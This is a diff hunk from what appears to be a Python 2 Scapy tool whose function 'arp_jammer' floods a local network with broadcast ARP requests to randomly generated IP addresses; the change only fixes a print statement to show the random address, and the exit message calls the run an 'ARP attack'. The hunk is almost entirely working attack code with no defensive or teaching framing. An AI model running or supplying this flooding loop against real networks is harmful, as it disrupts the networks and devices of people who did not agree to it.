@@ -24,7 +24,7 @@ def arp_jammer():
             d = random.randint(1, 254)
             random_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
             srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=random_ip), timeout=2, verbose=0)
-            print "send " + ip + " sucess!"
+            print "send " + random_ip + " sucess!"
         except KeyboardInterrupt:
             print "[*] ARP attack finished."
             sys.exit(0)
